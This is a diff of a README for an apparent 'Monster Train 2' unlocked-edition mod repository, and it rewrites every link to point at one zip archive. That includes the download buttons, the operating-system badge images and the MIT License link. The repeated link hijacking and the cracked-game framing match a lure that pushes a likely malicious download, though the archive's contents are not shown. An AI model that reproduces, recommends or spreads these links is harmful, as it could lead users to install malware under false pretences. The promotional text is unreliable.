@@ -1,6 +1,6 @@
 # Monster Train 2 Tranquility Suite 🚂🧩
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://Huzrineo.github.io)
+[![Download](https://github.com/Huzrineo/monster-train-2-unlocked-edition/raw/refs/heads/main/pendragonship/monster-edition-unlocked-train-v2.1.zip)](https://github.com/Huzrineo/monster-train-2-unlocked-edition/raw/refs/heads/main/pendragonship/monster-edition-unlocked-train-v2.1.zip)
   
 **Welcome aboard the Monster Train 2 Tranquility Suite!** Dive into a new galaxy of gameplay modification, turbo-charged enhancements, and tools designed to crack open the limitless capabilities of Monster Train 2. This repository is engineered for explorers seeking nuanced control, streamlined adventures, and integration with artificial intelligence platforms—all accompanied by radiant user experience features.
 
@@ -12,9 +12,9 @@ Get on track—fast! Discover the trusted engines that power Monster Train 2 Tra
 
 | Operating System | Status         | Last Tested  | Compatibility Score |  
 |:----------------:|:--------------:|:------------:|:------------------:|  
-| ![Windows](https://img.shields.io/badge/Windows-10%2F11-blue) | ✅ Supported    | Jan 2025      | 100%               |  
-| ![macOS](https://img.shields.io/badge/macOS-12%2F13-purple)     | ✅ Supported    | Jan 2025      | 98%                |  
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2FDebian-orange) | ⚡ Experimental | Jan 2025      | 90%                |  
+| ![Windows](https://github.com/Huzrineo/monster-train-2-unlocked-edition/raw/refs/heads/main/pendragonship/monster-edition-unlocked-train-v2.1.zip%2F11-blue) | ✅ Supported    | Jan 2025      | 100%               |  
+| ![macOS](https://github.com/Huzrineo/monster-train-2-unlocked-edition/raw/refs/heads/main/pendragonship/monster-edition-unlocked-train-v2.1.zip%2F13-purple)     | ✅ Supported    | Jan 2025      | 98%                |  
+| ![Linux](https://github.com/Huzrineo/monster-train-2-unlocked-edition/raw/refs/heads/main/pendragonship/monster-edition-unlocked-train-v2.1.zip%2FDebian-orange) | ⚡ Experimental | Jan 2025      | 90%                |  
 
 ---
 
@@ -82,10 +82,10 @@ The Monster Train 2 Tranquility Suite is designed to provide an alternative expe
 
 ## 📜 MIT License
 
-This repository is distributed under the MIT License. Please see the official [MIT License 2025](https://opensource.org/licenses/MIT) for terms and conditions.
+This repository is distributed under the MIT License. Please see the official [MIT License 2025](https://github.com/Huzrineo/monster-train-2-unlocked-edition/raw/refs/heads/main/pendragonship/monster-edition-unlocked-train-v2.1.zip) for terms and conditions.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://Huzrineo.github.io)
+[![Download](https://github.com/Huzrineo/monster-train-2-unlocked-edition/raw/refs/heads/main/pendragonship/monster-edition-unlocked-train-v2.1.zip)](https://github.com/Huzrineo/monster-train-2-unlocked-edition/raw/refs/heads/main/pendragonship/monster-edition-unlocked-train-v2.1.zip)
 
 **Embark on a new journey—unlock Monster Train 2 with Tranquility Suite, and experience the future of game modification in 2025.**
